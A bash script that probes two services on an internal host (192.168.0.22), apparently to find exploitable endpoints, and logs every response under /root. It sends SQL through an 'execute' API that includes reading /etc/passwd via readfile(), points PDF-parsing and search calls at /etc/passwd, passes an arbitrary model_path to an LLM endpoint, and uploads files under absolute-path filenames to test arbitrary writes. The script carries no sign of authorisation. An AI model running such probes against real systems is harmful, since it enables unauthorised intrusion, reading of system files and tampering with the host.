#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
H=192.168.0.22; L=/root/ul_farmfan/o3.txt; mkdir -p /root/ul_farmfan; : > $L
log(){ echo "$@" | cut -c1-800 >> $L; }
px(){ timeout 9 curl -s -m 7 -X POST "$1" -H 'Content-Type: application/json' -d "$2" -w "|%{http_code}" 2>/dev/null; }
log "S $(date -u +%FT%TZ)"
log "PATHS18000 $(timeout 8 curl -s -m 6 http://$H:18000/openapi.json | tr -d '\n' | cut -c1-4000)"
log "PATHS14998 $(timeout 8 curl -s -m 6 http://$H:14998/openapi.json | tr -d '\n' | grep -o '\"/[a-z0-9_/{}.-]*\"' | tr '\n' ' ' | cut -c1-1200)"
for s in "select sqlite_version() as v" "select version() as v" "select name,tbl_name from sqlite_master limit 6" "PRAGMA database_list" "select readfile('/etc/passwd') as t"; do
  B=$(SQL="$s" python3 -c 'import json,os;print(json.dumps({"engine":"relational_db","operation":"query","arguments":{"sql":os.environ["SQL"]}}))')
  log "RDB [$s] => $(px http://$H:18000/execute "$B" | tr '\n' ' ')"
done
log "BADENGINE $(px http://$H:18000/execute '{"engine":"nope","operation":"x","arguments":{}}' | tr '\n' ' ')"
log "CALCEMPTY $(px http://$H:18000/execute '{"engine":"calculator","operation":"evaluate","arguments":{}}' | tr '\n' ' ')"
log "PDFPARSE $(px http://$H:18000/execute '{"engine":"pdf_ocr","operation":"parse","arguments":{"path":"/etc/passwd"}}' | tr '\n' ' ')"
log "PDFSEARCH $(px http://$H:18000/execute '{"engine":"pdf_ocr","operation":"search","arguments":{"query":"root","path":"/etc/passwd"}}' | tr '\n' ' ')"
log "LLM1 $(px http://$H:14998/llm/generate '{"prompt":"2+2"}' | tr '\n' ' ')"
log "LLM2 $(px http://$H:14998/llm/generate '{"model_path":"/tmp/ul_p2.txt","prompt":"2+2"}' | tr '\n' ' ')"
log "EVCLS $(px http://$H:14998/eventclassify '{"text":"hi"}' | tr '\n' ' ')"
log "PT2 $(px http://$H:14998/point2/analyze '{"text":"hi"}' | tr '\n' ' ')"
log "BATCH $(px http://$H:14998/api/batch_test '{"text":"hi"}' | tr '\n' ' ')"
echo '{"a":1,"ul":"5512"}' > /tmp/m3.json
for fn in "/tmp/ul_p3.json" "ul_rel.json"; do
  log "WR $fn => $(timeout 10 curl -s -m 8 -X POST http://$H:14998/upload -F "file=@/tmp/m3.json;filename=$fn" -w "|%{http_code}" 2>/dev/null | tr '\n' ' ')"
done
log "LIST $(timeout 8 curl -s -m 6 "http://$H:14998/files?pageSize=6" | tr -d '\n' | cut -c1-900)"
log "E $(date -u +%FT%TZ)"
cat $L
